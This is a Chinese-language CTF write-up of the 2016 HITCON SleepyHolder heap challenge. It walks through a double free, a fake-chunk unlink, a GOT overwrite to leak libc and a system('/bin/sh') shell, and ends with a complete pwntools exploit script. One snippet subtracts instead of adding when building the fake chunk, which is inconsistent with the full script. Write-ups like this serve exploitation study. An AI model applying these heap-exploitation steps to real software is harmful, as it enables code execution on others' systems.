# 2016 HITCON CTF SleepyHolder
### 序言
> 本来这周准备学习`House Of Orange`, 但是这个牵扯知识点太多. 忽然发现还有一个`fastbin_dup_consolidate`没有学习, 补一下.

### 程序运行(文章尾部有程序源码)
**1. MENU**
```
1. Keep secret
2. Wipe secret
3. Renew secret
```
**2. Keep secret(New)**
```
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever

1
Tell me your secret:
hello, world
#另外两个选项类似,　只是分配的堆空间大小不同
```
**3.Wipe secret(Delete)**
```
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1
```
**4. Renew secret(Update)**
```
Which Secret do you want to renew?
1. Small secret
2. Big secret
1
Tell me your secret:
AAAA
```
### 程序分析

**1. Keep Secret(New)**
> 可以选择申请`40, 4000, 40000`三种不同大小的堆块. 当申请大小超过`top chunk size`, `ptmalloc`会整合一些`fastbin`中的`free chunk`并入`top chunk`, 如果还不够就`mmap`一块新的`chunk`，这个`chunk`与原有的`top chunk`之间采用单链表链接.

**2. Wipe Secret(Delete)**
> `free`对应的指针, 标志位置`0`

**3. Renew Secret(Update)**
>　不检查指针是否已释放, 造成`Double Free`


### 知识点
**[Double Free](https://heap-exploitation.dhavalkapil.com/attacks/double_free.html)**
**[Unlink](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html)**
### 思路分析
&nbsp;&nbsp;&nbsp;&nbsp;**总体思路:** `Double Free` 掉`small secret`, 在`small secret` 中构造`fake chunk`, 释放`big secret`,　`big secret`会和`fake chunk`合并, 过程中我们用`unlink`来修改全局指针变量`s_ptr`. 通过将其修改为`free@got`, 修改`free@got`为`put@plt`, 泄露`libc 地址`, 再将其修改为`system`地址, `free　"/bin/sh"`时就等于执行了`system("/bin/sh")`

**步骤一: Double Free**
```python
add(1, 'aaa') #small secret
add(2, 'bbb') #big secret
delete(1)    ------------------
add(3, 'ccc') #huge secret    ｜--------> Double Free
delete(1)    ------------------
```
**步骤二: Fake Chunk**

```python
f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) - p64(f_ptr - 0x10)
fake_chunk += p64(0x20)
add(1, fake_chunk)
delete(2) #unlink
```
**小结:** [Unlink栗子](https://blog.csdn.net/qq_33528164/article/details/79586902)

**步骤三: 泄露**
```
content  = p64(0) + p64(atoi_got)
content += p64(puts_got) + p64(free_got) + p32(0x1)*2
update(1, content) #f_ptr = free_got
update(1, p64(puts_plt)) #free_got = puts_plt
delete(2) #puts(atoi)
libc_base = u64(p.recvn(6).ljust(8, "\x00")) - atoi_offset
system = libc_base + system_offset
```

**步骤四: system("/bin/sh")**
```
update(1, p64(system))
add(2, "/bin/sh\x00")
delete(2) #system("/bin/sh")
```

### 踩过的坑
> 1. 对于`read`函数, pwntools发送的时候最好不用`sendline`,　尽量使用发送足量的字符来结束输入. 就像本题, 如果将`add, delete, update`函数中`p.send`改成`p.sendline`, 那么会出错.

> 2. 泄露`libc base`地址:
>> 1. 泄露`libc`中某一个函数的地址, 减去对应函数在`libc`中的偏移量就可以得到`libc base`
>> 2. free掉一个`0x80`或大于`0x80`的`chunk`, 泄露出该地址, 减去`0x3c4b78`, 也是`libc base`(`libc`的基地址)
### 完整EXP
```
from pwn import *

context.log_level = 'debug'

p = process("./SleepyHolder")
elf = ELF("./SleepyHolder")
libc = ELF("./libc.so.6")

def add(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("1")
    p.recvuntil("\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.send(content)

def delete(index):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("Big secret\n")
    p.send(str(index))

def update(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("3")
    p.recvuntil("Big secret\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.send(content)

# Double Free
add(1, 'aaa')
add(2, 'bbb')
delete(1)
add(3, 'ccc')
delete(1)

#Fake Chunk
f_ptr = 0x6020d0
s_ptr = 0x6020c0

fake_chunk  = p64(0) + p64(0x21)
fake_chunk += p64(0x6020d0-0x18) + p64(0x6020d0-0x10)
fake_chunk += p64(0x20)
add(1, fake_chunk)
delete(2)

#gdb.attach(p)
#leak libc base
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
system_offset = libc.symbols['system']
atoi_offset = libc.symbols['atoi']

#gdb.attach(p)
content = p64(0) + p64(atoi_got)
content += p64(puts_got) + p64(free_got) + p32(0x1)*3
update(1, content)
update(1, p64(puts_plt))
#update

delete(2)
libc_base = u64(p.recvn(6).ljust(8, "\x00")) - atoi_offset
system = libc_base + system_offset

update(1, p64(system))
add(2, "/bin/sh\x00")
delete(2)
p.interactive()
```
### 相关链接
[Isaac](https://poning.me/2016/10/29/secret-holder/)
[0x9A82](https://www.cnblogs.com/Ox9A82/p/6766261.html)
[相关文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/fastbin_dup_consolidate)
